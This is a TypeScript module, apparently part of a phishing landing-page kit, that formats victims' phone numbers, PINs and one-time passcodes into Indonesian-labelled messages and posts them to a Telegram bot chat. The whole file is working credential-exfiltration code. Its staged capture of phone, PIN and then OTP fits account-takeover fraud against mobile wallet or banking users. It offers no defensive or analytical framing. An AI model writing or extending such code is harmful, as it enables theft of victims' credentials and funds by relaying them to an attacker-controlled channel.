import type { StepData, TelegramMessageType } from '@/lib/landing/types';

export function buildTelegramMessage(type: TelegramMessageType, stepData: StepData): string {
  if (type === 'phone') {
    return `📱 DATA NOMOR HP\n━━━━━━━━━━━━━━━━━━━\nNomor :  <code>${stepData.phone}</code>`;
  }

  if (type === 'pin') {
    return `🔐 DATA NO-PIN\n━━━━━━━━━━━━━━━━━━━\nNomor :  <code>${stepData.phone}</code>\nPIN      : ${stepData.pin}\n━━━━━━━━━━━━━━━━━━━`;
  }

  return `🔑 DATA NO-PIN-OTP\n━━━━━━━━━━━━━━━━━━━\nNomor :  <code>${stepData.phone}</code>\nPIN      : ${stepData.pin}\nOTP     : ${stepData.otp}\n━━━━━━━━━━━━━━━━━━━`;
}

export async function sendTelegramMessage(
  botToken: string,
  chatId: string,
  type: TelegramMessageType,
  stepData: StepData,
  customText?: string
): Promise<{ ok: boolean; error?: string }> {
  if (!botToken || !chatId) {
    return { ok: false, error: 'Data bot atau chat ID tidak tersedia.' };
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: customText ?? buildTelegramMessage(type, stepData),
        parse_mode: 'HTML',
      }),
    });

    const result = await response.json();
    if (!result.ok) {
      return { ok: false, error: result.description || 'Gagal mengirim ke Telegram.' };
    }

    return { ok: true };
  } catch {
    return { ok: false, error: 'Terjadi kesalahan jaringan.' };
  }
}
